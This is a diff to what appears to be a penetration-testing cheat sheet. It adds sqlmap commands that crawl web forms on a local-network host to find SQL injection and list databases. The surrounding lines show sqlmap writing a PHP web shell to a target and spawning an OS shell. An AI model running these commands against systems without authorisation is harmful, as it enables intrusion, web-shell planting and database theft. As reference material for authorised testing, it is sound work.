@@ -2957,6 +2957,12 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+
+# Automate find sqli in form
+sqlmap -u "http://192.168.162.49/index.php" --forms --crawl=2 --batch --dbs
+or
+sqlmap -u "http://192.168.162.49/contact.php" --forms --crawl=3 --batch --dbs 
+
 ```
 ## Attacking Common Applications
 
